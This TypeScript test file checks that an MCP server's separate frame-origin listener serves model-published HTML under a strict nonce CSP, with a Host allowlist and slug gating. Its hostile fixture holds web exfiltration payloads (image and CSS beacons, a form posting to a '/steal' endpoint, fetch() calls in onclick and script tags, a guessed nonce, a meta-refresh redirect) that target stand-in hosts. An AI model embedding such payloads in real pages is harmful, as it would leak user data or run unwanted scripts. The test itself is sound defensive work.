// Issue 25 — free-form HTML hatch: end-to-end over real MCP + the SECOND
// (frame-origin) HTTP listener. A HOSTILE fixture proves each vector reaches the
// browser INERT (served verbatim, neutralized by the header CSP), while the two
// markup vectors CSP does not cover (<meta refresh>, model nonce) are stripped.
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import {
  bearer,
  ensureCanvasBuilt,
  httpRequest,
  spawnServer,
  toolJson,
  type SpawnedServer,
} from "./helpers.js";

let server: SpawnedServer;
let framePort: number;

beforeAll(async () => {
  ensureCanvasBuilt();
  server = await spawnServer();
  framePort = Number(readFileSync(join(server.stateDir, "frame-port"), "utf8"));
}, 30_000);

afterAll(async () => {
  await server?.close();
});

// Every classic exfil / execution vector in one document.
const HOSTILE_HTML =
  "<h1>Report</h1>" +
  '<img src="https://beacon.example/pixel.png" alt="x">' + // network img beacon
  '<div style="background:url(https://beacon.example/bg.png)">css beacon</div>' +
  '<form action="https://beacon.example/steal" method="post"><input name="x"></form>' +
  '<button onclick="fetch(\'https://beacon.example/click\')">click</button>' +
  "<script>fetch('https://beacon.example/script')</script>" +
  '<script nonce="attacker-guess">alert(1)</script>' +
  '<meta http-equiv="refresh" content="0;url=https://refresh.example/go">' +
  "<p>end</p>";

async function publishHostile(): Promise<{ id: string; slug: string }> {
  const published = toolJson(
    await server.client.callTool({
      name: "publish_artifact",
      arguments: { type: "html", title: "Hostile", html: HOSTILE_HTML },
    }),
  );
  const id = published.artifact_id as string;
  const detail = await httpRequest({
    port: server.port,
    path: `/api/artifacts/${id}`,
    headers: bearer(server.token()),
  });
  const body = JSON.parse(detail.body) as {
    content: { type: string; html?: string; frameSlug?: string };
  };
  // The html body NEVER travels to the parent canvas — only the slug does.
  expect(body.content.type).toBe("html");
  expect(body.content.html).toBeUndefined();
  expect(body.content.frameSlug).toMatch(/^[0-9a-f]{32}$/);
  return { id, slug: body.content.frameSlug! };
}

describe("html hatch — frame server", () => {
  test("frame origin is a DISTINCT port from the canvas", () => {
    expect(framePort).toBeGreaterThan(0);
    expect(framePort).not.toBe(server.port);
  });

  test("/api/health advertises the frame origin", async () => {
    const res = await httpRequest({
      port: server.port,
      path: "/api/health",
      headers: bearer(server.token()),
    });
    const payload = JSON.parse(res.body) as { frameOrigin: string | null };
    expect(payload.frameOrigin).toBe(`http://127.0.0.1:${framePort}`);
  });

  test("the canvas CSP allows framing the frame origin (frame-src)", async () => {
    const page = await httpRequest({
      port: server.port,
      path: `/?token=${server.token()}`,
    });
    expect(page.headers["content-security-policy"]).toContain(
      `frame-src http://127.0.0.1:${framePort}`,
    );
  });

  test("frame routes are token-free and gated ONLY by the 128-bit slug", async () => {
    const { slug } = await publishHostile();
    // No token anywhere → still served (the slug is the capability).
    const ok = await httpRequest({ port: framePort, path: `/f/${slug}` });
    expect(ok.status).toBe(200);
    expect(ok.headers["content-type"]).toContain("text/html");

    // Unknown but well-formed slug → 404 (leaks nothing).
    const miss = await httpRequest({ port: framePort, path: `/f/${"0".repeat(32)}` });
    expect(miss.status).toBe(404);
    // Non-matching path → 404.
    const bad = await httpRequest({ port: framePort, path: "/f/short" });
    expect(bad.status).toBe(404);
  });

  test("frame server enforces the Host allowlist (DNS-rebinding defense)", async () => {
    const { slug } = await publishHostile();
    const res = await httpRequest({
      port: framePort,
      path: `/f/${slug}`,
      headers: { Host: "evil.test" },
    });
    expect(res.status).toBe(403);
  });

  test("served document carries the exact nonce CSP header", async () => {
    const { slug } = await publishHostile();
    const res = await httpRequest({ port: framePort, path: `/f/${slug}` });
    const csp = String(res.headers["content-security-policy"]);
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("style-src 'unsafe-inline'");
    expect(csp).toContain("img-src data:");
    expect(csp).toContain("font-src data:");
    expect(csp).toContain("connect-src 'none'");
    expect(csp).toContain("form-action 'none'");
    expect(csp).toContain("base-uri 'none'");
    expect(csp).toContain(`frame-ancestors http://127.0.0.1:${server.port}`);
    // script-src is nonce-only (no 'unsafe-inline', no host) → model scripts die.
    const nonceInCsp = /script-src 'nonce-([^']+)'/.exec(csp);
    expect(nonceInCsp).not.toBeNull();
    // The prelude <script> carries the SAME nonce; nothing else does.
    const nonceInDoc = /<script nonce="([^"]+)">/.exec(res.body);
    expect(nonceInDoc).not.toBeNull();
    expect(nonceInDoc![1]).toBe(nonceInCsp![1]);
    expect(res.body.match(/nonce=/g)?.length).toBe(1);
  });

  test("hostile vectors reach the browser INERT (served verbatim, CSP-neutralized)", async () => {
    const { slug } = await publishHostile();
    const res = await httpRequest({ port: framePort, path: `/f/${slug}` });
    const doc = res.body;
    // Present verbatim — the browser receives them, the CSP renders them inert.
    expect(doc).toContain('src="https://beacon.example/pixel.png"'); // img-src data: blocks
    expect(doc).toContain("background:url(https://beacon.example/bg.png)"); // img-src blocks
    expect(doc).toContain('action="https://beacon.example/steal"'); // form-action none blocks
    expect(doc).toContain('onclick="fetch'); // script-src nonce blocks inline handler
    expect(doc).toContain("fetch('https://beacon.example/script')"); // no nonce → blocked
    // STRIPPED (CSP can't cover these): meta refresh + the model's nonce.
    expect(doc).not.toContain("refresh.example");
    expect(doc).not.toContain("http-equiv");
    expect(doc).not.toContain("attacker-guess");
    expect(doc).toContain("<script>alert(1)</script>"); // nonce stripped, still inert
  });

  test("token canary: the served frame document never contains the token", async () => {
    const { slug } = await publishHostile();
    const res = await httpRequest({ port: framePort, path: `/f/${slug}` });
    expect(res.body).not.toContain(server.token());
  });

  test("a non-html artifact's slug space is never served by the frame port", async () => {
    // Publish a prose artifact; it has no frame slug and cannot be framed.
    const prose = toolJson(
      await server.client.callTool({
        name: "publish_artifact",
        arguments: { type: "prose", title: "P", markdown: "# hi" },
      }),
    );
    const detail = await httpRequest({
      port: server.port,
      path: `/api/artifacts/${prose.artifact_id as string}`,
      headers: bearer(server.token()),
    });
    const body = JSON.parse(detail.body) as { content: { frameSlug?: string } };
    expect(body.content.frameSlug).toBeUndefined();
  });
});
